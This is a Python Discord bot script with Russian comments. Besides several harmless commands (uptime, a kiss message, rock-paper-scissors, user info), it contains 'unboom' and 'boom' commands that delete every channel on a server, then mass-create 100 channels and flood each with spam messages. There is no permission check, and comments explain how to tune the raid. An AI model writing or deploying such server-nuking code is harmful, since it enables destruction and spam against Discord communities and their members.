import nextcord
from nextcord.ext import commands
import random
import asyncio
import requests
import discord
from nextcord.ext.commands import Bot, MemberConverter
from datetime import datetime

intents = nextcord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='/', intents=intents) 

start_time = datetime.now()

async def log_command(ctx):
    line = "----------------------------------------"
    command_info = (
        f"\n{line}\n"
        f"Команда: {ctx.message.content}\n"
        f"Пользователь: {ctx.author} (ID: {ctx.author.id})\n"
        f"Канал: {ctx.channel} (ID: {ctx.channel.id})\n"
        f"Сервер: {ctx.guild.name if ctx.guild else 'Direct Message'} (ID: {ctx.guild.id if ctx.guild else 'N/A'})\n"
        f"Время: {datetime.now()}\n"
        f"ID Сообщения: {ctx.message.id}\n" 
        f"{line}"
    )
    print(command_info)


# Определение события on_command_completion, которое вызывается, когда команда успешно выполнена
@bot.event
async def on_command_completion(ctx):
    await log_command(ctx)

@bot.command()
async def uptime(ctx):
    delta_time = datetime.now() - start_time
    await ctx.send(f"Бот был запущен {delta_time.days} дней, {delta_time.seconds // 3600} часов, {delta_time.seconds // 60 % 60} минут и {delta_time.seconds % 60} секунд назад.")

@bot.command()
async def kiss(ctx):
    if ctx.message.mentions:   
        await ctx.send(f"{ctx.author.mention} поцеловал {ctx.message.mentions[0].mention} ")    

@bot.command()
async def rps(ctx, choice):
    choices = ["камень", "ножницы", "бумага"]
    bot_choice = random.choice(choices)

    if choice.lower() in choices:
        if choice.lower() == bot_choice:
            result = "Ничья!"
        elif (choice.lower() == "камень" and bot_choice == "ножницы") or \
             (choice.lower() == "ножницы" and bot_choice == "бумага") or \
             (choice.lower() == "бумага" and bot_choice == "камень"):
            result = f"Вы победили! Бот выбрал {bot_choice}"
        else:
            result = f"Бот победил! Бот выбрал {bot_choice}"
    else:
        result = "Пожалуйста, выберите один из: камень, ножницы, бумага"

    await ctx.send(result)

@bot.command()
async def userinfo(ctx, member: str):
    try:
        pr = ''
        converter = MemberConverter()
        member = await converter.convert(ctx, member)
        
        user_embed = discord.Embed(
            title=f'{pr} Информация о пользователе',
            colour=discord.Color(int('FF0000', 16)),
            timestamp=datetime.now()
        )
        user_embed.set_thumbnail(url=member.avatar.url)
        user_embed.add_field(name='Имя', value=member.display_name, inline=False)
        user_embed.add_field(name='ID Пользователя', value=member.id, inline=False)
        user_embed.add_field(name='Присоединился', value=member.joined_at.strftime('%d-%m-%Y %H:%M:%S'), inline=False)
        user_embed.add_field(name='Аккаунт создан', value=member.created_at.strftime('%d-%m-%Y %H:%M:%S'), inline=False)
        user_embed.add_field(name="Роль на сервере", value=f"{member.top_role.mention}", inline=False)
        user_embed.set_footer(text='Информация о пользователе',)
        await ctx.send(embed=user_embed)

    except discord.ext.commands.errors.MemberNotFound:
        await ctx.send('Пользователь не найден.')
    
    except Exception as e:
        print('Возникла ошибка:', e)
        error_message = f'Произошла ошибка: {e}'
        await ctx.send(error_message)

@bot.command()
async def unboom(ctx):
    guild = ctx.guild
    await delete_all_channels(guild)

async def delete_all_channels(guild):
    for channel in guild.channels:
                    await channel.delete()

@bot.command()
async def boom(ctx, num_channels=100, num_messages=100):  # тут вводите количество каналов(num_channels) сколько каналов вы хотите создать и колво сообщений(num_messages)
    guild = ctx.guild
    await asyncio.gather(delete_all_channels(guild), create_channels(guild, num_channels, num_messages))

async def delete_all_channels(guild):
    await asyncio.gather(*[channel.delete() for channel in guild.channels])

async def create_channels(guild, num_channels, num_messages):
    tasks = []
    for i in range(num_channels):
        channel_name = f'123' # тут будет название каналов
        tasks.append(send_messages(guild, channel_name, num_messages))

    await asyncio.gather(*tasks)

async def send_messages(guild, channel_name, num_messages):
    channel = await guild.create_text_channel(channel_name)
    
    for i in range(num_messages):
        await channel.send('boom🦧')     # это сообщение которое будет в каналах           

bot.run('TOKEN') # тут ваш токен
